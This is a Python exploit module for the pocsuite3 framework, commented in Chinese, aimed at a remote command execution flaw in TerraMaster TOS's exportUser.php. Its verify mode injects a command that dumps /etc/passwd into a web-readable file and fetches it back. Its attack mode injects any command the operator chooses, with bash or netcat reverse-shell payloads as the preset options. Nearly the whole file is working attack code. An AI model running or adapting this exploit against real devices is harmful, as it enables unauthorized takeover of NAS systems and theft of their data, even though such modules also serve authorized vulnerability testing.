from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import json,random
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = 'TerraMaster TOS exportUser.php 远程命令执行'
    appName = 'TerraMaster'
    appVersion = '未知'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''TerraMaster TOS exportUser.php 文件中存在远程命令执行漏洞'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o
    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)>test.txt"
            r = requests.get(url=target,timeout=8,verify=False)
            target1 = self.url+"/include/test.txt"
            r1 = requests.get(url=target1,timeout=8,verify=False)
            if r1.status_code == 200 and "root" in r1.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return
    def _attack(self):#验证模式
        result = {}
        cmd = self.get_option("command")
        try:
            target = self.url+"/include/exportUser.php?type=3&cla=application&func=_exec&opt=({})>test.txt".format(cmd)
            r = requests.get(url=target,timeout=8,verify=False)
            target1 = self.url+"/include/test.txt"
            r1 = requests.get(url=target1,timeout=8,verify=False)
            if r1.status_code == 200:
                print(r1.text)
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)